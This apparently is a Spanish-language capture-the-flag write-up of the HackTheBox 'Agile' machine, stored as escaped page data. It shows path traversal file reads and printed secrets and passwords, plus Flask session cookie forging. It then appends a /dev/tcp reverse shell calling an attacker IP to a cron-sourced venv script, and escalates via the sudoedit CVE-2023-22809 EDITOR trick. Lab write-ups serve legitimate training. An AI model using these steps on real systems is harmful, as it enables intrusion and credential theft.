rel=\\\"stylesheet\\\" href=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=style.css\\\"\u003e\\n    \u003clink rel=\\\"shortcut icon\\\"\\n        href=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=console.png\\\"\u003e\\n    \u003cscript src=\\\"?__debugger__=yes\u0026amp;cmd=res\u0026amp;f=debugger.js\\\"\u003e\u003c/script\u003e\\n    \u003cscript\u003e\\n      var CONSOLE_MODE = false,\\n          EVALEX = true,\\n          EVALEX_TRUSTED = false,\\n          SECRET = \\\"0k71JQ5bp0qM5tHnQe0w\\\";\\n    \u003c/script\u003e\\n  \u003c/head\u003e\\n~~~\\n\\nDatos del archivo hosts\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:03 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 253\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n127.0.0.1 localhost superpass.htb test.superpass.htb\\n127.0.1.1 agile\\n\\n# The following lines are desirable for IPv6 capable hosts\\n::1     ip6-localhost ip6-loopback\\nfe00::0 ip6-localnet\\nff00::0 ip6-mcastprefix\\nff02::1 ip6-allnodes\\nff02::2 ip6-allrouters\\n~~~\\n\\nArchivo /etc/mysql/my.cnf\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:05 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 682\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n#\\n# The MySQL database server configuration file.\\n#\\n# You can copy this to one of:\\n# - \\\"/etc/mysql/my.cnf\\\" to set global options,\\n# - \\\"~/.my.cnf\\\" to set user-specific options.\\n# \\n# One can use all long options that the program supports.\\n# Run program with --help to get a list of available options and with\\n# --print-defaults to see which it would actually understand and use.\\n#\\n# For explanations see\\n# http://dev.mysql.com/doc/mysql/en/server-system-variables.html\\n\\n#\\n# * IMPORTANT: Additional settings that can override those from this file!\\n#   The files must end with '.cnf', otherwise they'll be ignored.\\n#\\n\\n!includedir /etc/mysql/conf.d/\\n!includedir /etc/mysql/mysql.conf.d/\\n~~~\\n\\nKernel versión\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:08 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 184\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nLinux version 5.15.0-60-generic (buildd@lcy02-amd64-054) (gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #66-Ubuntu SMP Fri Jan 20 14:29:49 UTC 2023\\n~~~\\n\\n\\nNginx error log\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:48:51 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 82947\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n2023/02/28 16:21:17 [error] 1004#1004: *14 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n2023/02/28 16:23:58 [error] 1004#1004: *18 open() \\\"/app/app/superpass/static/webfonts/josefinsans.ttf\\\" failed (2: No such file or directory), client: 10.10.14.40, server: superpass.htb, request: \\\"GET /static/webfonts/josefinsans.ttf HTTP/1.1\\\", host: \\\"superpass.htb\\\", referrer: \\\"http://superpass.htb/static/css/josefinsans.css\\\"\\n\\n~~~\\n\\nConsultamos el archivo  /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~ bash\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 17:15:30 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 88\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\n{\\\"SQL_URI\\\": \\\"mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass\\\"}\\n~~~\\n\\nCódigo fuente de app.py\\n\\n~~~http\\nGET /download?fn=../../app/app/superpass/app.py HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~python\\n\\nimport json\\nimport os\\nimport sys\\nimport flask\\nimport jinja_partials\\nfrom flask_login import LoginManager\\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))\\nfrom superpass.infrastructure.view_modifiers import response\\nfrom superpass.data import db_session\\n\\napp = flask.Flask(__name__)\\napp.config['SECRET_KEY'] = 'MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD'\\n\\n\\ndef register_blueprints():\\n    from superpass.views import home_views\\n    from superpass.views import vault_views\\n    from superpass.views import account_views\\n    \\n    app.register_blueprint(home_views.blueprint)\\n    app.register_blueprint(vault_views.blueprint)\\n    app.register_blueprint(account_views.blueprint)\\n\\n\\ndef setup_db():\\n    db_session.global_init(app.config['SQL_URI'])\\n\\n\\ndef configure_login_manager():\\n    login_manager = LoginManager()\\n    login_manager.login_view = 'account.login_get'\\n    login_manager.init_app(app)\\n\\n    from superpass.data.user import User\\n\\n    @login_manager.user_loader\\n    def load_user(user_id):\\n        from superpass.services.user_service import get_user_by_id\\n        return get_user_by_id(user_id)\\n\\n\\ndef configure_template_options():\\n    jinja_partials.register_extensions(app)\\n    helpers = {\\n        'len': len,\\n        'str': str,\\n        'type': type,\\n    }\\n    app.jinja_env.globals.update(**helpers)\\n\\n\\ndef load_config():\\n    config_path = os.getenv(\\\"CONFIG_PATH\\\")\\n    with open(config_path, 'r') as f:\\n        for k, v in json.load(f).items():\\n            app.config[k] = v\\n\\n\\ndef configure():\\n    load_config()\\n    register_blueprints()\\n    configure_login_manager()\\n    setup_db()\\n    configure_template_options()\\n\\n\\ndef enable_debug():\\n    from werkzeug.debug import DebuggedApplication\\n    app.wsgi_app = DebuggedApplication(app.wsgi_app, True)\\n    app.debug = True\\n\\n\\ndef main():\\n    enable_debug()\\n    configure()\\n    app.run(debug=True)\\n\\n\\ndef dev():\\n    configure()\\n    app.run(port=5555)\\n\\n\\nif __name__ == '__main__':\\n    main()\\nelse:\\n    configure()\\n\\n~~~\\n\\nUsamos el secret_key para extraer la información de la cookie del usuario\\n\\nCredenciales encontradas\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vEF5_-9daSA.ZAYqgQ.Zvh6p_nlvHTv1LtEwEhcdp-rjUo\\n~~~\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '9'}\\n~~~\\n\\nCreamos nuestra propia session\\n\\n~~~python\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\n~~~\\n\\nEl comando a usar es:\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\n![](/Agile/Pasted_image_20230306150725.png)\\n\\nLuego lo intentamos con el  \\\\_user_id: 2\\n\\n![](/Agile/Pasted_image_20230306150956.png)\\n\\nUsers:\\n\\n~~~bash\\ncorum\\nrunner\\nedwards\\ndev_admin\\nsuperpassuser\\n~~~\\n\\nPasswords:\\n\\n~~~bash\\nMNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD\\ndSA6l7q*yIVs$39Ml6ywvgK\\n0k71JQ5bp0qM5tHnQe0w\\n~~~\\n\\n~~~text\\n0xdf:762b430d32eea2f12970\\n0xdf:5b133f7a6a1c180646cb\\ncorum:47ed1e73c955de230a1d\\ncorum:9799588839ed0f98c211\\ncorum:5db7caa1d13cc37c9fc2\\n~~~\\n\\n## Getting a shell\\n\\nIntentamos acceder a través de SSH con las credenciales del usuario Corum\\n\\n~~~ bash\\nssh corum@10.129.30.106\\n~~~\\n\\n![](/Agile/Pasted_image_20230306155037.png)\\n\\n### System Enumeration\\n\\nProcesos interesantes\\n\\n![](/Agile/Pasted_image_20230306160615.png)\\n\\nArchivos interesantes\\n\\n~~~bash\\n/var/www/html/index.nginx-debian.html                                                                                                                                                 \\n/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc\\n/app/app-testing/tests/functional/creds.txt\\n/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc\\n/app/app-testing/tests/functional/test_site_interactively.py\\n/app/app-testing/requirements.txt\\n/app/app-testing/.pytest_cache/.gitignore\\n/app/app-testing/.pytest_cache/CACHEDIR.TAG\\n/app/app-testing/.pytest_cache/v/cache/stepwise\\n/app/app-testing/.pytest_cache/v/cache/nodeids\\n/app/app-testing/.pytest_cache/v/cache/lastfailed\\n/app/app-testing/.pytest_cache/README.md\\n/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc\\n/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc\\n/app/app-testing/superpass/views/vault_views.py\\n/app/app-testing/superpass/views/home_views.py\\n/app/app-testing/superpass/views/account_views.py\\n/app/app-testing/superpass/__pycache__/app.cpython-310.pyc\\n/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc\\n~~~\\n\\n## Privilege Escalation a Edwards\\n\\nIntentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile\\n\\n~~~bash\\nssh -L 8080:localhost:5555 corum@10.10.11.203\\n~~~\\n\\nNos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.\\n\\nTomamos nuestra cookie y vemos que el id asignado es el 2\\n\\n~~~bash\\nflask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc\\n~~~\\n\\n~~~json\\n{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '2'}\\n~~~\\n\\nAsumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1\\n\\n~~~bash\\nflask-unsign --sign --cookie \\\"{'_flashes': [('message', 'Please log in to access this page.'), ('message', 'Please log in to access this page.')], '_fresh': True, '_id': 'fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90', '_user_id': '1'}\\\" -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD \\n.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA\\n~~~\\n\\nLogramos acceder a las credenciales del usuario edwards\\n\\n![](/Agile/Pasted_image_20230309120804.png)\\n\\n\\nSus datos son:\\n\\n~~~\\nedwards:d07867c6267dcb5df0af\\ndedwards__:7dbfe676b6b564ce5718\\n~~~\\n\\nFinalmente ingresamos al sistemas a través de ssh con estas últimas credenciales\\n\\n![](/Agile/Pasted_image_20230309121717.png)\\n\\n## User Edwards Enumeration\\n\\nVerificamos los permisos sudo\\n\\n~~~\\nsudo -l\\n~~~\\n\\n~~~bash\\n[sudo] password for edwards: \\nMatching Defaults entries for edwards on agile:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\\\:/snap/bin, use_pty\\n\\nUser edwards may run the following commands on agile:\\n    (dev_admin : dev_admin) sudoedit /app/config_test.json\\n    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt\\n\\n~~~\\n\\nCon sudoedit podemos modificar un archivo protegido por el administrador\\n\\nIntentamos acceder al archivo config_test.json\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/config_test.json\\n~~~\\n\\nconfig_test.json\\n\\n![](/Agile/Pasted_image_20230309122920.png)\\n\\n~~~json\\n{\\n    \\\"SQL_URI\\\": \\\"mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest\\\"\\n}\\n~~~\\n\\nIntentamos acceder al archivo creds.txt\\n\\n~~~bash\\nsudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nSu cotenido es:\\n\\n![](/Agile/Pasted_image_20230309122823.png)\\n\\n~~~\\nedwards:1d7ffjwrx#$d6qn!9nndqgde4\\n~~~\\n\\n\\nVerificamos cuales son los archivos que el usuario web_admin puede modificar \\n\\n~~~bash\\nfind /  -user dev_admin 2\u003e/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt\\n-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json\\n-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json\\n~~~\\n\\nVerificamos que puede modificar el grupo dev_admin\\n\\n~~~bash\\nfind /  -group dev_admin 2\u003e/dev/null | xargs ls -al --color\\n~~~\\n\\n~~~bash\\n-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1\\n-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate\\n-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh\\n-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish\\n\\n/app/venv:\\ntotal 24\\ndrwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .\\ndrwxr-xr-x 6 root root      4096 Feb  8 16:29 ..\\ndrwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 include\\ndrwxrwxr-x 3 root root      4096 Feb  8 16:29 lib\\nlrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -\u003e lib\\n-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg\\n\\n/app/venv/bin:\\ntotal 1380\\ndrwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .\\ndrwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..\\n-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1\\n-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate\\n-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh\\n-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish\\n-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask\\n-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test\\n-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python -\u003e python3\\nlrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -\u003e /usr/bin/python3\\nlrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -\u003e python3\\n-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi\\nls: cannot open directory '/home/dev_admin': Permission denied\\n\\n~~~\\n\\nPara comprender mayormente el sistema revisamos el script test_and_update.sh\\n\\n~~~bash\\n#!/bin/bash\\n\\n# update prod with latest from testing constantly assuming tests are passing\\n\\necho \\\"Starting test_and_update\\\"\\ndate\\n\\n# if already running, exit\\nps auxww | grep -v \\\"grep\\\" | grep -q \\\"pytest\\\" \u0026\u0026 exit\\n\\necho \\\"Not already running. Starting...\\\"\\n\\n# start in dev folder\\ncd /app/app-testing\\n\\n# system-wide source doesn't seem to happen in cron jobs\\nsource /app/venv/bin/activate\\n\\n# run tests, exit if failure\\npytest -x 2\u003e\u00261 \u003e/dev/null || exit\\n\\n# tests good, update prod (flask debug mode will load it instantly)\\ncp -r superpass /app/app/\\necho \\\"Complete!\\\"\\n\\n~~~\\n\\nBásicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.\\n\\nIntentaremos que el script source /app/venv/bin/activate quede de la siguiente forma (añadimos una shell reversa al final del script)\\n\\n~~~bash\\n# This file must be used with \\\"source bin/activate\\\" *from bash*\\n# you cannot run it directly\\n\\ndeactivate () {\\n    # reset old environment variables\\n    if [ -n \\\"${_OLD_VIRTUAL_PATH:-}\\\" ] ; then\\n        PATH=\\\"${_OLD_VIRTUAL_PATH:-}\\\"\\n        export PATH\\n        unset _OLD_VIRTUAL_PATH\\n    fi\\n    if [ -n \\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\" ] ; then\\n        PYTHONHOME=\\\"${_OLD_VIRTUAL_PYTHONHOME:-}\\\"\\n        export PYTHONHOME\\n        unset _OLD_VIRTUAL_PYTHONHOME\\n    fi\\n\\n    # This should detect bash and zsh, which have a hash command that must\\n    # be called to get it to forget past commands.  Without forgetting\\n    # past commands the $PATH changes we made may not be respected\\n    if [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n        hash -r 2\u003e /dev/null\\n    fi\\n\\n    if [ -n \\\"${_OLD_VIRTUAL_PS1:-}\\\" ] ; then\\n        PS1=\\\"${_OLD_VIRTUAL_PS1:-}\\\"\\n        export PS1\\n        unset _OLD_VIRTUAL_PS1\\n    fi\\n\\n    unset VIRTUAL_ENV\\n    unset VIRTUAL_ENV_PROMPT\\n    if [ ! \\\"${1:-}\\\" = \\\"nondestructive\\\" ] ; then\\n    # Self destruct!\\n        unset -f deactivate\\n    fi\\n}\\n\\n# unset irrelevant variables\\ndeactivate nondestructive\\n\\nVIRTUAL_ENV=\\\"/app/venv\\\"\\nexport VIRTUAL_ENV\\n\\n_OLD_VIRTUAL_PATH=\\\"$PATH\\\"\\nPATH=\\\"$VIRTUAL_ENV/bin:$PATH\\\"\\nexport PATH\\n\\n# unset PYTHONHOME if set\\n# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)\\n# could use `if (set -u; : $PYTHONHOME) ;` in bash\\nif [ -n \\\"${PYTHONHOME:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PYTHONHOME=\\\"${PYTHONHOME:-}\\\"\\n    unset PYTHONHOME\\nfi\\n\\nif [ -z \\\"${VIRTUAL_ENV_DISABLE_PROMPT:-}\\\" ] ; then\\n    _OLD_VIRTUAL_PS1=\\\"${PS1:-}\\\"\\n    PS1=\\\"(venv) ${PS1:-}\\\"\\n    export PS1\\n    VIRTUAL_ENV_PROMPT=\\\"(venv) \\\"\\n    export VIRTUAL_ENV_PROMPT\\nfi\\n\\n# This should detect bash and zsh, which have a hash command that must\\n# be called to get it to forget past commands.  Without forgetting\\n# past commands the $PATH changes we made may not be respected\\nif [ -n \\\"${BASH:-}\\\" -o -n \\\"${ZSH_VERSION:-}\\\" ] ; then\\n    hash -r 2\u003e /dev/null\\nfi\\n0\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/10.10.14.118/4242; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196\\n\\n~~~\\n\\nVerificamos la versión de sudo\\n\\n![](/Agile/Pasted_image_20230311000023.png)\\n\\n## Elevación de Privilegios\\n\\nPara escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:\\n\\n[CVE-2023-22809](https://nvd.nist.gov/vuln/detail/CVE-2023-22809)\\n[Detalles de vulnerabilidad](https://www.openwall.com/lists/oss-security/2023/01/19/1)\\n\\nEn base al exploit creamos la siguiente variable de  entorno\\n\\n~~~bash\\nexport EDITOR=vim -- /app/venv/bin/activate\\n~~~\\n\\nLuego intentamos modificar el archivo creds.txt\\n\\n~~~bash\\nsudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt\\n~~~\\n\\nAgregamos la linea para nuestra reverse shell\\n\\n![](/Agile/Pasted_image_20230311000753.png)\\n\\nGuardamos\\n\\n![](/Agile/Pasted_image_20230311000618.png)\\n\\nUsamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos\\n\\n![](/Agile/Pasted_image_20230310235255.png)\\n\\nFinalmente obtenemos acceso al sistema como root\\n\",\"data\":{\"title\":\"HackTheBox - Maquina Agile\",\"subtitle\":\"Paso a paso de la explotación de la máquina Agile de HackTheBox.\",\"dificultad\":\"Medium\",\"os\":\"Sistema Operativo Linux\",\"date\":\"2024-02-10T00:00:00.000Z\",\"tags\":[\"HackTheBox\"]},\"content\":\"\\n## Enumeración de puertos\\n\\n### TCP \\n\\nEnumeracion de Puertos TCP\\n\\n~~~ bash\\nnmap -p- -A 10.129.30.106\\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST\\nNmap scan report for 10.129.30.106\\nHost is up (0.15s latency).\\nNot shown: 65533 closed tcp ports (conn-refused)\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)\\n|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)\\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\\n|_http-title: Did not follow redirect to http://superpass.htb\\n|_http-server-header: nginx/1.18.0 (Ubuntu)\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 502.76 seconds\\n~~~\\n\\n\\n\\n### UDP\\n  \\nEnumeración de puertos UDP\\n\\n~~~ bash\\nsudo nmap -F -sU 10.129.30.106\\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST\\nNmap scan report for agile.htb (10.129.30.106)\\nHost is up (0.15s latency).\\nNot shown: 99 closed udp ports (port-unreach)\\nPORT   STATE         SERVICE\\n68/udp open|filtered dhcpc\\n\\nNmap done: 1 IP address (1 host up) scanned in 106.72 seconds\\n~~~\\n\\n\\n## Enumeracion de Servicios     \\n\\n### Puerto 80\\n\\nDefinimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)\\n\\n![](/Agile/Pasted_image_20230306113515.png)\\n\\nIntentamos registrarnos en la aplicacion web\\n\\n![](/Agile/Pasted_image_20230306114025.png)\\n\\nAl intentarlo obtenemos el siguiente error\\n\\n![](/Agile/Pasted_image_20230306113616.png)\\n\\nLuego de registrarnos ingresamos a la siguiente página\\n\\nPodemos ingresar algunas credenciales al baul.Intentamos exportarlas\\n\\nLuego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)\\n\\n~~~http\\nGET /download?fn=../../etc/passwd HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: 